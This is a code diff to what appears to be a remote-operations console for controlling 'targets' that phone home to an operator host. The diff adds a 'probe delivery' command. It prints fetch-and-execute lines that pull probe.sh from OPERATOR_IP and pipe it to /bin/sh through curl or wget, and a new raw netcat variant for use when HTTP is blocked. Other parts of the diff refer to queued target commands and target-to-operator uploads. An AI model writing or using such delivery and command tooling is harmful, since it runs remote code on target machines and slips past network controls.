@@ -22343,6 +22343,7 @@ def run_line_tui(cfg):
                     ("probe --start",                           "start the probe.sh listener on port 22207"),
                     ("probe",                                   "show the target-side command (warns if listener is down)"),
                     ("probe --queue",                           "queue probe command for selected target's next phone-home"),
+                    ("probe delivery",                          "show wget, curl, and raw nc delivery commands"),
                     ("probe results",                           "show received probe results (arch, kernel, bits, endian)"),
                     ("probe config [N]",                        "generate config from the most recent or numbered probe result"),
                     ("probe config --write-config FILE",        "generate and save config"),
@@ -22351,7 +22352,7 @@ def run_line_tui(cfg):
                 ],
                 "notes": [
                     "probe.sh captures: arch (uname_m), kernel, OS, word size, endian.",
-                    "No griTTYkit required — only needs wget or curl on the target.",
+                    "No griTTYkit required — download with wget, curl, or raw nc over HTTP.",
                     "probe config uses estimated defaults for libc/filesystem; use survey config for full data.",
                 ],
                 "examples": [
@@ -23547,15 +23548,33 @@ def run_line_tui(cfg):
         # Build curl variant from the same URL
         script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
         route = probe_route_context(cfg)
-        url = f"http://{route.get('host', 'OPERATOR_IP')}:{route.get('port', 22207)}/{script_name}"
+        route_host = str(route.get("host", "OPERATOR_IP") or "OPERATOR_IP")
+        route_port = int(route.get("port", 22207) or 22207)
+        url = f"http://{route_host}:{route_port}/{script_name}"
         curl_cmd = f"curl -fsSL {shquote(url)} | /bin/sh"
+        nc_cmd = (
+            "printf 'GET /"
+            + script_name.replace("'", "")
+            + " HTTP/1.0\\r\\nHost: "
+            + route_host.replace("'", "")
+            + "\\r\\n\\r\\n' | nc "
+            + shquote(route_host)
+            + " "
+            + shquote(str(route_port))
+            + " | sed '1,/^\\r*$/d' | /bin/sh"
+        )
 
         print("")
         print("  Delivery options (pick what the target has):")
         print(f"    wget:  {wget_cmd}")
         print(f"    curl:  {curl_cmd}")
+        print(f"    nc:    {nc_cmd}")
         print(f"    ssh:   ssh root@target '{wget_cmd}'")
         print(f"    copy:  scp <(curl -s {shquote(url)}) root@target:/tmp/probe.sh && ssh root@target 'sh /tmp/probe.sh'")
+        print("")
+        print("  Current listener: probe-http")
+        print("  Not yet served here: probe-tftp, probe-ftp, probe-dns")
+        print("  If HTTP is blocked but nc works, use the nc command above against the same listener.")
         print("")
         print("  probe results  — after running any of the above")
 
@@ -27410,6 +27429,10 @@ def run_line_tui(cfg):
                         clear_line_probe_results(console_args[2:])
                     elif subcmd == "serve":
                         run_line_probe_serve(console_args[2:])
+                    elif subcmd in {"delivery", "deliver", "commands"}:
+                        if len(console_args) > 2:
+                            raise ValueError("usage: probe delivery")
+                        _print_probe_delivery()
                     elif subcmd in {"help", "-h", "--help"}:
                         print_line_command_help("probe")
                     else:
@@ -29774,7 +29797,8 @@ Operations:
                                 show or queue target fetch of a staged file
   download [--queue] TARGET_PATH
                                 show or queue a target-to-operator upload command
-  probe [--start|--queue]       show, serve, or queue probe
+  probe [--start|--queue], probe delivery
+                                show, serve, queue, or print probe delivery commands
   downloads                     list target-fetchable staged files
   unstage NAME                  remove a staged file request
   view PATH, cat PATH           view a local session/artifact path
